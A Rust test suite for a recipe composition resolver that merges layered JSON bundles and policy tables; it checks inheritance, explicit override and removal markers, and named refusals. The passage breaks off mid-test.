//! Composition proof (decision 0017). The resolver is a pure function
//! over recipe sources, so every test here is a library of small JSON
//! documents on disk and an assertion about the ONE flat bundle they
//! resolve to — or about the refusal that names the file and the key.
use super::compose::resolve;
use super::*;
use serde_json::json;

fn error<T>(result: Result<T, CompileError>) -> String {
    match result {
        Ok(_) => panic!("expected the composition to fail"),
        Err(error) => error.to_string(),
    }
}

/// A recipe library: sibling recipe directories under one parent, which
/// is exactly what `<leaf>/../<name>` resolves against.
struct Library {
    /// Held only to keep the directory alive for the test's lifetime.
    _dir: tempfile::TempDir,
    /// The canonical spelling, which is what the resolver records: on
    /// macOS the temp root is /var -> /private/var, so an expectation
    /// built from `TempDir::path` compares two spellings of one place.
    canon: PathBuf,
}

impl Library {
    fn new() -> Library {
        let dir = tempfile::tempdir().unwrap();
        let canon = dir.path().canonicalize().unwrap();
        Library { _dir: dir, canon }
    }

    fn path(&self) -> &Path {
        &self.canon
    }

    /// Write `<library>/<name>/` with a `bundle.json`, a role file, and
    /// a `policy.json` when a table is given.
    fn recipe(&self, name: &str, bundle: &Value, policy: Option<&Value>) -> PathBuf {
        let dir = self.path().join(name);
        std::fs::create_dir_all(dir.join("roles")).unwrap();
        std::fs::write(dir.join("roles/role.md"), format!("# {name}\n")).unwrap();
        std::fs::write(dir.join("bundle.json"), serde_json::to_vec(bundle).unwrap()).unwrap();
        if let Some(policy) = policy {
            std::fs::write(dir.join("policy.json"), serde_json::to_vec(policy).unwrap()).unwrap();
        }
        // Canonical, like every dir the resolver records: on macOS the
        // temp root is /var -> /private/var, and an expectation built
        // from the uncanonicalized path would compare two spellings of
        // one directory.
        dir.canonicalize().unwrap()
    }
}

fn base_policy() -> Value {
    json!({
        "schema": "forge.phase-machine/v1",
        "phases": ["work", "review", "done"],
        "initial": "work",
        "terminal": ["done"],
        "rules": [
            {"id":"WORK", "from":"work", "result":"complete", "next":"review", "reason":"work"},
            {"id":"REVIEW", "from":"review", "result":"clean", "next":"done", "reason":"review"},
        ],
    })
}

fn seat(results: Vec<&str>) -> Value {
    json!({
        "results": results,
        "role": "roles/role.md",
        "driver": {"command": ["./drive", "plain"]},
    })
}

fn base_bundle() -> Value {
    json!({
        "name": "base",
        "policy": "policy.json",
        "seats": {"work": seat(vec!["complete"]), "review": seat(vec!["clean"])},
    })
}

/// A derived recipe over `base`, with whatever extra members the test
/// needs merged in.
fn derived(extra: Value) -> Value {
    let mut document = json!({"name": "derived", "extends": "base"});
    for (key, value) in extra.as_object().unwrap() {
        document[key] = value.clone();
    }
    document
}

/// The parts of a resolution that must be byte-stable.
fn shape(resolved: &super::compose::Resolved) -> String {
    let chain: Vec<Value> = resolved
        .chain
        .iter()
        .map(|ancestor| json!({"recipe": ancestor.name, "digest": ancestor.digest}))
        .collect();
    serde_json::to_string(&json!({
        "name": resolved.name,
        "document": resolved.document,
        "table": resolved.table,
        "origin": resolved.seat_origin,
        "chain": chain,
    }))
    .unwrap()
}

#[test]
fn resolution_is_pure_and_walks_the_chain_to_arbitrary_depth() {
    // AC-1: no dependence on the clock, the environment, read_dir order
    // or hash iteration — the same sources resolve byte-identically.
    let library = Library::new();
    let plain = library.recipe("base", &base_bundle(), Some(&base_policy()));
    assert_eq!(
        shape(&resolve(&plain).unwrap()),
        shape(&resolve(&plain).unwrap())
    );
    let flat = resolve(&plain).unwrap();
    assert!(flat.chain.is_empty(), "no extends, no chain");
    assert_eq!(flat.chain_note(), None);
    assert_eq!(flat.roots, vec![plain.clone()]);
    assert_eq!(flat.seat_origin["work"], 0);

    // AC-2: a chain of depth three, each layer's own `extends` honoured.
    library.recipe(
        "middle",
        &json!({"name": "middle", "extends": "base",
                "seats": {"audit": seat(vec!["clean"])}}),
        None,
    );
    let leaf = library.recipe(
        "leaf",
        &json!({"name": "leaf", "extends": "middle",
                "seats": {"extra": seat(vec!["clean"])}}),
        None,
    );
    let deep = resolve(&leaf).unwrap();
    assert_eq!(shape(&deep), shape(&resolve(&leaf).unwrap()));
    assert_eq!(
        deep.chain
            .iter()
            .map(|a| a.name.as_str())
            .collect::<Vec<_>>(),
        vec!["middle", "base"]
    );
    assert_eq!(
        deep.chain_note().unwrap(),
        "composed: leaf -> middle -> base"
    );
    assert_eq!(deep.roots.len(), 3);
    // Origin is name-level: each seat points at the layer that wrote it.
    assert_eq!(deep.seat_origin["extra"], 0);
    assert_eq!(deep.seat_origin["audit"], 1);
    assert_eq!(deep.seat_origin["work"], 2);
    // The base's table is inherited whole: only the base declared one.
    assert_eq!(deep.table["initial"], json!("work"));
}

#[test]
#[expect(clippy::too_many_lines, reason = "baseline 2026-09, #288")]
fn a_derived_recipe_overrides_one_named_select_case_and_no_neighbour() {
    let library = Library::new();
    let body = |driver: &str| json!({"role":"roles/role.md", "driver":{"command":[driver]}});
    let base = json!({
        "name":"base", "policy":"policy.json",
        "seats": {
            "work": {"results":["complete"], "limits":{"max_attempts":1}, "select": {"on":"strategy", "cases": {
                "chore": body("chore"), "feature": body("feature"),
                "design": body("design"), "engine": body("engine")
            }, "default":{"role":"roles/default.md", "driver":{"command":["default"]}}}},
            "review": seat(vec!["clean"])
        }
    });
    let base_dir = library.recipe("base", &base, Some(&base_policy()));
    std::fs::write(base_dir.join("roles/default.md"), "# base default\n").unwrap();
    let leaf = library.recipe(
        "derived",
        &derived(json!({
            "override":{"cases":["work:feature"]},
            "seats":{"work":{"select":{"cases":{"feature":body("replacement")}}}}
        })),
        None,
    );
    let resolved = resolve(&leaf).unwrap();
    assert_eq!(
        resolved.seats["work"].pointer("/select/cases/feature/driver/command/0"),
        Some(&json!("replacement"))
    );
    assert_eq!(
        resolved.seats["work"].pointer("/select/cases/chore/driver/command/0"),
        Some(&json!("chore"))
    );
    assert_ne!(
        resolved.case_origin["work:feature"], resolved.case_origin["work:chore"],
        "case provenance follows the layer that wrote that case"
    );
    assert_eq!(
        resolved.seat_origin["work"], 1,
        "a case-only override does not move the inherited seat or default"
    );
    let compiled = Bundle::compile(&leaf).unwrap();
    let (selected, selected_case) = compiled.seats["work"].body.selected(None).unwrap();
    assert_eq!(selected_case, Some("default"));
    let ExecutableBody::Single { role_path, .. } = selected else {
        panic!("the inherited default must stay a single seat")
    };
    assert_eq!(
        role_path,
        base_dir.join("roles/default.md"),
        "the inherited default resolves against the layer that wrote it"
    );

    for (extra, expected) in [
        (
            json!({"override":{"cases":["work"]}, "seats":{"work":{"select":{"cases":{"feature":body("x")}}}}}),
            "must be '<seat>:<case>'",
        ),
        (
            json!({"override":{"cases":["review:feature"]}, "seats":{"review":{"select":{"cases":{"feature":body("x")}}}}}),
            "no ancestor defines it",
        ),
        (
            json!({"override":{"cases":["work:design"]}, "seats":{"work":{"select":{"cases":{"feature":body("x")}}}}}),
            "does not redefine it",
        ),
        (
            json!({"override":{"limits":["review"]}, "seats":{"review":{"limits":{"max_attempts":2}}}}),
            "no ancestor defines it",
        ),
        (
            json!({"override":{"limits":["work"]}, "seats":{"work":{"select":{"cases":{"feature":body("x")}}}}}),
            "does not redefine it",
        ),
        (
            json!({"override":{"cases":["work:chore"]}, "seats":{"work":{"select":{"cases":{"chore":body("x"), "feature":body("y")}}}}}),
            "case 'feature' is not named by override.cases",
        ),
        (
            json!({"override":{"cases":["work:feature"]}, "seats":{"work":{"select":{"on":"strategy", "cases":{"feature":body("x")}}}}}),
            "partial case override may contain only select.cases",
        ),
        (
            json!({"override":{"cases":["work:feature"]}, "seats":{"work":{"select":{"cases":{"feature":body("x")}}, "limits":{"max_attempts":3}}}}),
            "member 'limits' is not covered by its partial override",
        ),
        (
            json!({"override":{"limits":["work"]}, "seats":{"work":{"limits":{"max_attempts":3}, "select":{"cases":{"feature":body("x")}}}}}),
            "member 'select' is not covered by its partial override",
        ),
    ] {
        let bad = library.recipe("derived", &derived(extra), None);
        assert!(error(resolve(&bad)).contains(expected));
    }

    let limits = library.recipe(
        "derived",
        &derived(json!({
            "override":{"limits":["work"]},
            "seats":{"work":{"limits":{"max_attempts":3}}}
        })),
        None,
    );
    assert_eq!(
        resolve(&limits).unwrap().seats["work"]["limits"]["max_attempts"],
        3
    );

    let both = library.recipe(
        "derived",
        &derived(json!({
            "override":{"cases":["work:feature"], "limits":["work"]},
            "seats":{"work":{"select":{"cases":{"feature":body("replacement")}},
                               "limits":{"max_attempts":4}}}
        })),
        None,
    );
    let both = resolve(&both).unwrap();
    assert_eq!(both.seats["work"]["limits"]["max_attempts"], 4);
    assert_eq!(
        both.seats["work"].pointer("/select/cases/feature/driver/command/0"),
        Some(&json!("replacement"))
    );

    let whole = library.recipe(
        "derived",
        &derived(json!({
            "override":{"seats":["work"], "limits":["work"]},
            "seats":{"work":{"results":["complete"], "limits":{"max_attempts":2},
                "role":"roles/role.md", "driver":{"command":["whole"]}}}
        })),
        None,
    );
    assert_eq!(resolve(&whole).unwrap().seat_origin["work"], 0);

    std::fs::write(library.path().join("base/secrets.env"), "SECRET=value").unwrap();
    assert!(error(resolve(&whole)).contains("secrets store"));
}

#[test]
fn cycles_depth_names_and_the_name_grammar_are_refused() {
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));

    // AC-3: the error names the whole loop, in order.
    let alone = library.recipe("alone", &json!({"name": "alone", "extends": "alone"}), None);
    assert!(error(resolve(&alone)).contains("cycle: alone -> alone"));

    library.recipe("two", &json!({"name": "two", "extends": "one"}), None);
    let one = library.recipe("one", &json!({"name": "one", "extends": "two"}), None);
    assert!(error(resolve(&one)).contains("cycle: one -> two -> one"));

    library.recipe("c", &json!({"name": "c", "extends": "a"}), None);
    library.recipe("b", &json!({"name": "b", "extends": "c"}), None);
    let a = library.recipe("a", &json!({"name": "a", "extends": "b"}), None);
    assert!(error(resolve(&a)).contains("cycle: a -> b -> c -> a"));

    // AC-4: a chain deeper than eight layers names the chain so far.
    for step in 0..9 {
        library.recipe(
            &format!("deep{step}"),
            &json!({"name": format!("deep{step}"), "extends": format!("deep{}", step + 1)}),
            None,
        );
    }
    let deep = library.path().join("deep0");
    let too_deep = error(resolve(&deep));
    assert!(too_deep.contains("deeper than 8 layers"), "{too_deep}");
    assert!(too_deep.contains("deep0 -> deep1"), "{too_deep}");

    // AC-5: a missing base names the leaf file, the name, and the
    // directory searched.
    let orphan = library.recipe(
        "orphan",
        &json!({"name": "orphan", "extends": "absent"}),
        None,
    );
    let missing = error(resolve(&orphan));
    assert!(named(&missing).contains("orphan/bundle.json"), "{missing}");
    assert!(missing.contains("extends 'absent'"), "{missing}");
    assert!(
        named(&missing).contains(&named(&library.path().to_string_lossy())),
        "{missing}"
    );

    // AC-6: the grammar is checked BEFORE any path is built.
    for bad in ["../x", "a/b", "SDD", ".", ""] {
        let leaf = library.recipe("bad", &json!({"name": "bad", "extends": bad}), None);
        let refusal = error(resolve(&leaf));
        assert!(refusal.contains("is not a recipe name"), "{bad}: {refusal}");
        assert!(
            named(&refusal).contains("bad/bundle.json"),
            "{bad}: {refusal}"
        );
    }
    let typed = library.recipe("typed", &json!({"name": "typed", "extends": 7}), None);
    assert!(error(resolve(&typed)).contains("'extends' must be the name"));

    // ...and the whole grammar is legal, not just the letters: a name
    // may open with a digit and carry dashes.
    let mut numbered = base_bundle();
    numbered["name"] = json!("2x-base");
    library.recipe("2x-base", &numbered, Some(&base_policy()));
    let numeric = library.recipe(
        "numeric",
        &json!({"name": "numeric", "extends": "2x-base"}),
        None,
    );
    assert_eq!(resolve(&numeric).unwrap().chain[0].name, "2x-base");

    // AC-12: `name` is required in every layer and must differ from
    // every ancestor's.
    let nameless = library.recipe("nameless", &json!({"extends": "base"}), None);
    assert!(error(resolve(&nameless)).contains("missing 'name'"));
    let twin = library.recipe("twin", &json!({"name": "base", "extends": "base"}), None);
    let clash = error(resolve(&twin));
    assert!(clash.contains("already declares"), "{clash}");
    assert!(named(&clash).contains("twin/bundle.json"), "{clash}");
}

#[test]
fn seats_merge_by_name_and_every_conflict_is_explicit() {
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));

    // AC-7: adding a seat the base lacks needs no marker.
    let added = library.recipe(
        "derived",
        &derived(json!({"seats": {"audit": seat(vec!["clean"])}})),
        None,
    );
    let resolved = resolve(&added).unwrap();
    assert_eq!(resolved.seats.len(), 3);
    assert_eq!(resolved.seat_origin["audit"], 0);

    // AC-8: redefining one the base HAS fails without the marker,
    // naming both files and the seat.
    let clash = library.recipe(
        "derived",
        &derived(json!({"seats": {"review": seat(vec!["clean"])}})),
        None,
    );
    let refusal = error(resolve(&clash));
    assert!(refusal.contains("redefines seat 'review'"), "{refusal}");
    assert!(named(&refusal).contains("derived/bundle.json"), "{refusal}");
    assert!(named(&refusal).contains("base/bundle.json"), "{refusal}");
    assert!(refusal.contains("override.seats"), "{refusal}");

    // ...and succeeds with it, replacing the value wholesale.
    let marked = library.recipe(
        "derived",
        &derived(json!({
            "override": {"seats": ["review"]},
            "seats": {"review": {"results": ["clean"], "role": "roles/role.md",
                                 "driver": {"command": ["paranoid"]}}},
        })),
        None,
    );
    let resolved = resolve(&marked).unwrap();
    assert_eq!(
        resolved.seats["review"]["driver"]["command"],
        json!(["paranoid"])
    );
    assert_eq!(resolved.seat_origin["review"], 0);
    assert_eq!(resolved.seat_origin["work"], 1);

    // AC-9: a stale marker is a lie about the composition.
    for (extra, why) in [
        (
            json!({"override": {"seats": ["absent"]},
                   "seats": {"absent": seat(vec!["clean"])}}),
            "no ancestor defines it",
        ),
        (
            json!({"override": {"seats": ["review"]}}),
            "this recipe does not redefine it",
        ),
    ] {
        let stale = library.recipe("derived", &derived(extra), None);
        assert!(error(resolve(&stale)).contains(why));
    }

    // AC-10: removal is explicit, and fails when its target is absent.
    let removed = library.recipe(
        "derived",
        &derived(json!({"remove": {"seats": ["review"]}})),
        None,
    );
    let resolved = resolve(&removed).unwrap();
    assert!(!resolved.seats.contains_key("review"));
    assert!(!resolved.seat_origin.contains_key("review"));

    let absent = library.recipe(
        "derived",
        &derived(json!({"remove": {"seats": ["nothing"]}})),
        None,
    );
    let refusal = error(resolve(&absent));
    assert!(
        refusal.contains("'remove.seats' names 'nothing'"),
        "{refusal}"
    );
    assert!(named(&refusal).contains("derived/bundle.json"), "{refusal}");

    // A removed seat may be declared again: it is an addition now.
    let readded = library.recipe(
        "derived",
        &derived(json!({"remove": {"seats": ["review"]},
                        "seats": {"review": seat(vec!["clean"])}})),
        None,
    );
    assert_eq!(resolve(&readded).unwrap().seat_origin["review"], 0);
}

#[test]
fn a_seat_the_resolver_has_never_heard_of_survives_byte_identically() {
    // AC-11, the decision-0016 layering guarantee. Composition resolves
    // recipe sources into one flat bundle FIRST; agent resolution runs
    // afterwards on that flat result. The resolver therefore treats a
    // seat as an opaque value: it decides only which value wins for a
    // name. Asserted against the resolved DOCUMENT, because parsing
    // discards unknown keys and would make the test vacuous.
    let library = Library::new();
    let exotic = json!({
        "results": ["clean"],
        "agent": "reviewer-of-the-future",
        "adapter": {"unheard-of": {"nested": [1, {"deep": true}], "empty": {}}},
        "role": "roles/role.md",
    });
    let mut base = base_bundle();
    base["seats"]["review"] = exotic.clone();
    library.recipe("base", &base, Some(&base_policy()));

    let inherited = library.recipe("derived", &derived(json!({})), None);
    let resolved = resolve(&inherited).unwrap();
    assert_eq!(
        serde_json::to_string(&resolved.document["seats"]["review"]).unwrap(),
        serde_json::to_string(&exotic).unwrap(),
        "an inherited seat is copied, never rewritten"
    );

    let replacement = json!({"results": ["clean"], "agent": "someone-else", "wat": [null]});
    let overridden = library.recipe(
        "derived",
        &derived(json!({
            "override": {"seats": ["review"]},
            "seats": {"review": replacement.clone()},
        })),
        None,
    );
    let resolved = resolve(&overridden).unwrap();
    assert_eq!(
        serde_json::to_string(&resolved.document["seats"]["review"]).unwrap(),
        serde_json::to_string(&replacement).unwrap(),
        "an overriding seat is copied, never rewritten"
    );
}

#[test]
fn bundle_members_and_marker_shapes_are_checked_by_name() {
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));

    // A bundle scalar the base does not set is a free addition; one it
    // does set needs `override.bundle`.
    let added = library.recipe(
        "derived",
        &derived(json!({"protected_phase": "review"})),
        None,
    );
    assert_eq!(
        resolve(&added).unwrap().document["protected_phase"],
        json!("review")
    );

    let mut protected = base_bundle();
    protected["protected_phase"] = json!("review");
    library.recipe("base", &protected, Some(&base_policy()));
    let clash = library.recipe(
        "derived",
        &derived(json!({"protected_phase": "work"})),
        None,
    );
    let refusal = error(resolve(&clash));
    assert!(
        refusal.contains("redefines bundle member 'protected_phase'"),
        "{refusal}"
    );
    let marked = library.recipe(
        "derived",
        &derived(json!({"override": {"bundle": ["protected_phase"]},
                        "protected_phase": "work"})),
        None,
    );
    assert_eq!(
        resolve(&marked).unwrap().document["protected_phase"],
        json!("work")
    );
    for (extra, why) in [
        (
            json!({"override": {"bundle": ["egress_minimum"]}, "egress_minimum": "local"}),
            "no ancestor sets it",
        ),
        (
            json!({"override": {"bundle": ["protected_phase"]}}),
            "this recipe does not set it",
        ),
    ] {
        let stale = library.recipe("derived", &derived(extra), None);
        assert!(error(resolve(&stale)).contains(why));
    }

    // Marker shapes are refused where they are written, by name.
    for (extra, needle) in [
        (json!({"override": "yes"}), "must be an object"),
        (
            json!({"override": {"frobnicate": []}}),
            "is not a member kind",
        ),
        (json!({"remove": {"seats": "review"}}), "must be an object"),
        (json!({"remove": {"seats": [7]}}), "must be an object"),
    ] {
        let bad = library.recipe("derived", &derived(extra), None);
        let refusal = error(resolve(&bad));
        assert!(refusal.contains(needle), "{refusal}");
        assert!(named(&refusal).contains("derived/bundle.json"), "{refusal}");
    }

    let bad_seats = library.recipe("derived", &derived(json!({"seats": []})), None);
    assert!(error(resolve(&bad_seats)).contains("'seats' must be an object"));
    let bad_policy = library.recipe("derived", &derived(json!({"policy": 3})), None);
    assert!(error(resolve(&bad_policy)).contains("'policy' must be a path"));

    // The pre-composition refusals still read exactly as they did.
    let bare = library.recipe("bare", &json!({"name": "bare"}), None);
    assert!(error(resolve(&bare)).contains("bundle.json missing 'policy'"));
    let seatless = library.recipe(
        "seatless",
        &json!({"name": "seatless", "policy": "policy.json"}),
        Some(&base_policy()),
    );
    assert!(error(resolve(&seatless)).contains("bundle.json missing 'seats'"));
}

#[test]
#[expect(clippy::too_many_lines, reason = "baseline 2026-09, #288")]
fn policy_is_per_layer_and_tables_merge_by_name() {
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));

    // A layer that declares no `policy` contributes no table: the
    // resolved table is the base's, read from the BASE's directory.
    let inherited = library.recipe("derived", &derived(json!({})), None);
    let resolved = resolve(&inherited).unwrap();
    assert_eq!(resolved.table["phases"], json!(["work", "review", "done"]));

    // AC-15: name arrays union, base order first; re-declaring an
    // inherited name is a no-op, not a conflict.
    let union = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({
            "phases": ["review", "audit"],
            "rules": [{"id":"AUDIT", "from":"audit", "result":"clean",
                       "next":"done", "reason":"audit"}],
        })),
    );
    let resolved = resolve(&union).unwrap();
    assert_eq!(
        resolved.table["phases"],
        json!(["work", "review", "done", "audit"])
    );

    // AC-13: derived rules precede base rules.
    assert_eq!(resolved.table["rules"][0]["id"], json!("AUDIT"));
    assert_eq!(resolved.table["rules"][1]["id"], json!("WORK"));
    assert_eq!(resolved.table["rules"].as_array().unwrap().len(), 3);

    // `override.table` replaces an array wholesale.
    let replaced = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json", "override": {"table": ["phases"]}})),
        Some(&json!({"phases": ["only"], "rules": []})),
    );
    assert_eq!(resolve(&replaced).unwrap().table["phases"], json!(["only"]));

    // A table scalar the base sets needs the marker too.
    let scalar = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"initial": "review", "rules": []})),
    );
    let refusal = error(resolve(&scalar));
    assert!(
        refusal.contains("redefines table member 'initial'"),
        "{refusal}"
    );
    assert!(named(&refusal).contains("base/policy.json"), "{refusal}");
    let scalar = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json", "override": {"table": ["initial"]}})),
        Some(&json!({"initial": "review", "rules": []})),
    );
    assert_eq!(resolve(&scalar).unwrap().table["initial"], json!("review"));

    // AC-10, the table half: removal is explicit and fails when absent.
    let removed = library.recipe(
        "derived",
        &derived(json!({"remove": {"phases": ["done"], "rules": ["REVIEW"]}})),
        None,
    );
    let resolved = resolve(&removed).unwrap();
    assert_eq!(resolved.table["phases"], json!(["work", "review"]));
    assert_eq!(resolved.table["terminal"], json!([]));
    assert_eq!(resolved.table["rules"].as_array().unwrap().len(), 1);
    for (extra, needle) in [
        (
            json!({"remove": {"phases": ["nowhere"]}}),
            "'remove.phases' names 'nowhere'",
        ),
        (
            json!({"remove": {"rules": ["NOPE"]}}),
            "'remove.rules' names 'NOPE'",
        ),
    ] {
        let bad = library.recipe("derived", &derived(extra), None);
        assert!(error(resolve(&bad)).contains(needle));
    }

    // AC-16: a schema mismatch names both policy files.
    let mismatch = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"schema": "forge.phase-machine/v2", "rules": []})),
    );
    let refusal = error(resolve(&mismatch));
    assert!(named(&refusal).contains("base/policy.json"), "{refusal}");
    assert!(named(&refusal).contains("derived/policy.json"), "{refusal}");
    assert!(refusal.contains("share one table schema"), "{refusal}");
    // The same schema, restated, is agreement rather than conflict.
    let agreeing = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"schema": "forge.phase-machine/v1", "rules": []})),
    );
    assert_eq!(
        resolve(&agreeing).unwrap().table["schema"],
        json!("forge.phase-machine/v1")
    );

    // Table shapes are refused by name.
    for (policy, needle) in [
        (
            json!({"phases": "work", "rules": []}),
            "must be an array of names",
        ),
        (json!({"rules": "none"}), "'rules' must be an array"),
        (json!({"rules": [{"from": "work"}]}), "needs a string 'id'"),
        (json!({"rules": [{"id": 4}]}), "needs a string 'id'"),
    ] {
        let bad = library.recipe(
            "derived",
            &derived(json!({"policy": "policy.json"})),
            Some(&policy),
        );
        let refusal = error(resolve(&bad));
        assert!(refusal.contains(needle), "{refusal}");
        assert!(named(&refusal).contains("derived/policy.json"), "{refusal}");
    }
}

#[test]
fn overriding_a_rule_is_remove_then_prepend() {
    // AC-14: exactly one rule with the overridden id survives, the
    // derived one, in derived position — a base twin left behind would
    // be unreachable and `Machine::from_table` would reject the table.
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    let leaf = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json", "override": {"rules": ["REVIEW"]}})),
        Some(&json!({"rules": [
            {"id":"REVIEW", "from":"review", "result":"clean", "next":"work",
             "reason":"paranoid: always re-work"},
        ]})),
    );
    let resolved = resolve(&leaf).unwrap();
    let rules = resolved.table["rules"].as_array().unwrap();
    assert_eq!(rules.len(), 2);
    assert_eq!(rules[0]["id"], json!("REVIEW"));
    assert_eq!(rules[0]["next"], json!("work"));
    assert_eq!(rules[1]["id"], json!("WORK"));
    brokkr_core::policy::Machine::from_table(&resolved.table).expect("no dead twin");

    // Without the marker it is a collision, named by file and id.
    let unmarked = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"rules": [
            {"id":"REVIEW", "from":"review", "result":"clean", "next":"work", "reason":"x"},
        ]})),
    );
    let refusal = error(resolve(&unmarked));
    assert!(
        refusal.contains("redefines policy rule 'REVIEW'"),
        "{refusal}"
    );
    assert!(named(&refusal).contains("base/policy.json"), "{refusal}");

    for (extra, policy, why) in [
        (
            json!({"policy": "policy.json", "override": {"rules": ["NOPE"]}}),
            json!({"rules": [{"id":"NOPE", "from":"work", "result":"complete",
                              "next":"review", "reason":"x"}]}),
            "no ancestor's table has it",
        ),
        (
            json!({"policy": "policy.json", "override": {"rules": ["REVIEW"]}}),
            json!({"rules": []}),
            "this recipe's table does not have it",
        ),
        (
            json!({"override": {"table": ["initial"]}}),
            json!({}),
            "this recipe's table does not set it",
        ),
        (
            json!({"policy": "policy.json", "override": {"table": ["absent"]}}),
            json!({"absent": 1, "rules": []}),
            "no ancestor's table sets it",
        ),
    ] {
        let stale = library.recipe("derived", &derived(extra), Some(&policy));
        assert!(error(resolve(&stale)).contains(why), "{why}");
    }
}

#[test]
fn an_overlay_that_shadows_or_opens_a_hole_is_reported_on_the_flat_table() {
    // Decision 0050 reads a composed table as the flat table `compose`
    // produces. Until its enactment enables the refusals the audit reports
    // and the loader admits (#429), so both overlays still resolve and load.
    use brokkr_core::policy::audit::{Finding, Setting, SWEEP_BUDGET};
    let findings = |leaf: &Path| {
        let machine = Machine::from_table(&resolve(leaf).unwrap().table).unwrap();
        machine
            .audit_with(SWEEP_BUDGET, is_engine_owned)
            .unwrap()
            .findings
    };
    let library = Library::new();
    let mut base = base_policy();
    base["rules"].as_array_mut().unwrap().insert(
        1,
        json!({"id":"REVIEW-FIXED", "from":"review", "result":"clean", "next":"work",
               "when": {"fixes_applied": true, "skip_verify": false}, "reason":"re-work"}),
    );
    library.recipe("base", &base_bundle(), Some(&base));
    // A derived rule is prepended ahead of the base rule it subsumes.
    let shadow = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"rules": [
            {"id":"REVIEW-ANY-FIX", "from":"review", "result":"clean", "next":"done",
             "when": {"fixes_applied": true}, "reason":"ship any fix"},
        ]})),
    );
    assert_eq!(
        findings(&shadow),
        [Finding::Shadowed {
            rule: "REVIEW-FIXED".into(),
            behind: "REVIEW-ANY-FIX".into(),
        }]
    );
    // An override narrows the base's fallback and leaves a valuation.
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    let hole = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json", "override": {"rules": ["REVIEW"]}})),
        Some(&json!({"rules": [
            {"id":"REVIEW", "from":"review", "result":"clean", "next":"done",
             "when": {"skip_verify": false}, "reason":"review"},
        ]})),
    );
    assert_eq!(
        findings(&hole),
        [Finding::Unruled {
            phase: "review".into(),
            result: "clean".into(),
            valuation: vec![("skip_verify".into(), Setting::Flag(true))],
        }]
    );
}

#[test]
fn the_constitutional_lint_runs_on_the_resolved_table() {
    // AC-17: a derived recipe may not make the protected review phase
    // avoidable (decision 0005). No new lint code — the existing one
    // simply sees the RESOLVED table.
    let library = Library::new();
    library.recipe("base", &base_bundle(), Some(&base_policy()));
    let around = library.recipe(
        "derived",
        &derived(json!({"policy": "policy.json"})),
        Some(&json!({"rules": [
            {"id":"SKIP", "from":"work", "result":"blocked", "next":"done",
             "reason":"ship without review"},
        ]})),
    );
    let refusal = error(Bundle::compile(&around));
    assert!(
        refusal.contains("bypasses the protected review gate"),
        "{refusal}"
    );
    // AC-18: wrapped ONCE with the chain, so the failure says what it
    // was composed from.
    assert!(refusal.contains("(composed: derived -> base)"), "{refusal}");

    // A non-composed bundle's errors are unwrapped, exactly as before.
    let alone = library.recipe("alone", &json!({"name": "alone"}), None);
    assert_eq!(
        error(Bundle::compile(&alone)),
        "bundle: bundle.json missing 'policy'"
    );
}

#[test]
fn inherited_seats_resolve_their_paths_against_the_layer_that_wrote_them() {
    // AC-19. The resolver records which layer supplied each seat BY
    // NAME; `Bundle::compile` hands that layer's directory to the
    // existing role/command parsers. It never learns that a seat has a
    // role at all.
    let library = Library::new();
    let base = library.recipe("base", &base_bundle(), Some(&base_policy()));
    let leaf = library.recipe(
        "derived",
        &derived(json!({
            "override": {"seats": ["work"]},
            "seats": {"work": seat(vec!["complete"])},
        })),
        None,
    );
    let bundle = Bundle::compile(&leaf).unwrap();
    assert_eq!(bundle.roots, vec![leaf.clone(), base.clone()]);
    let SeatBody::Single {
        role_path, command, ..
    } = &bundle.seats["review"].body
    else {
        panic!("the inherited review seat is a single driver")
    };
    assert_eq!(role_path, &base.join("roles/role.md"));
    assert_eq!(command[0], base.join("drive").to_string_lossy());
    assert_eq!(command[1], "plain");

    let SeatBody::Single { role_path, .. } = &bundle.seats["work"].body else {
        panic!("the overriding work seat is a single driver")
    };
    assert_eq!(role_path, &leaf.join("roles/role.md"));
}

#[test]
fn an_inherited_pinned_script_refuses_startup_metacharacters_at_compile() {
    // Compile on the actual filesystem, without starting an interpreter.
    // Unix execution does not reproduce Windows/MSYS startup parsing.
    let library = Library::new();
    let mut config = base_bundle();
    config["seats"]["work"]["hands"] = json!("workspace");
    config["seats"]["work"]["driver"]["command"] = json!([
        "{brokkr}",
        "driver",
        "exec",
        "--",
        "sh",
        "./scripts[1]/gate.sh"
    ]);
    let base = library.recipe("base", &config, Some(&base_policy()));
    for directory in ["scripts[1]", "scripts1"] {
        std::fs::create_dir(base.join(directory)).unwrap();
        std::fs::write(base.join(directory).join("gate.sh"), "#!/bin/sh\ntrue\n").unwrap();
    }
    let leaf = library.recipe("derived", &derived(json!({})), None);
    for boundary in [Boundary::Harness, Boundary::Open] {
        let refusal = error(Bundle::compile_under(&leaf, &base, &base, boundary));
        for expected in [
            "component \"scripts[1]\"",
            "character '['",
            "decision 0048",
            "decision 0046 ruling 4",
            "(composed: derived -> base)",
        ] {
            assert!(refusal.contains(expected), "{refusal}");
        }
    }
}

/// Decision 0046 ruling 4 (design DD9): an inherited exec seat with hands
/// is judged, under `harness`, against the layer that WROTE it — the
/// pinned-script lookup runs over the ancestor's directory, which is the
/// one the seat's `./` expands against. At spawn its script directory is
/// checked against the file map retained from the ancestor's compose
/// manifest (proposed 0048); drift names the ancestor and the script key,
/// while unrelated source edits and the leaf name nothing.
#[test]
fn an_inherited_seats_ancestor_is_re_derived_by_the_re_walk() {
    let library = Library::new();
    let mut base_bundle = base_bundle();
    base_bundle["seats"]["work"] = json!({
        "results": ["complete"],
        "role": "roles/role.md",
        "hands": "workspace",
        "driver": {"command": [
